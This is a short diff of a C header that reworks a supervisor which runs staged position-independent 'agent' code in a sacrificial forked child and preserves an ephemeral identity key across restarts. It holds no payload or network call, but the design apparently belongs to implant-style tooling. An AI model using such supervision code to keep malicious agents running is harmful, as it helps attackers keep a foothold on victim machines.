@@ -32,7 +32,7 @@
  * memory, and it works whether the child exits on its own or is killed.
  */
 
-typedef void (*supervise_entry_fn)(void *base_addr, size_t total_size);
+typedef void (*supervise_child_fn)(void *arg);
 
 #define SUPERVISE_KEY_FD_IN 100
 #define SUPERVISE_KEY_FD_OUT 101
@@ -106,11 +106,12 @@ static inline long supervise_read_all(int fd, uint8_t *buf, size_t len) {
 }
 
 /*
- * Run the agent PIC in a sacrificial child, caching and restoring its
- * ephemeral identity key across restarts. Never returns.
+ * Run the given stage child in a sacrificial process, caching and restoring
+ * its ephemeral identity key across restarts. The child callback is invoked
+ * with `arg` in the forked process and never returns here. Never returns.
  */
 __attribute__((noreturn)) static inline void
-supervise_run(supervise_entry_fn entry, void *stage_blob, size_t blob_size) {
+supervise_run(supervise_child_fn child, void *arg) {
   uint8_t cached_key[SUPERVISE_KEY_LEN];
   int have_key = 0;
 
@@ -146,7 +147,7 @@ supervise_run(supervise_entry_fn entry, void *stage_blob, size_t blob_size) {
         syscall2(SYS_dup2, kout[1], SUPERVISE_KEY_FD_OUT);
         supervise_close(kout[1]);
       }
-      entry(stage_blob, blob_size);
+      child(arg);
       syscall1(SYS_exit, 0);
     }
 
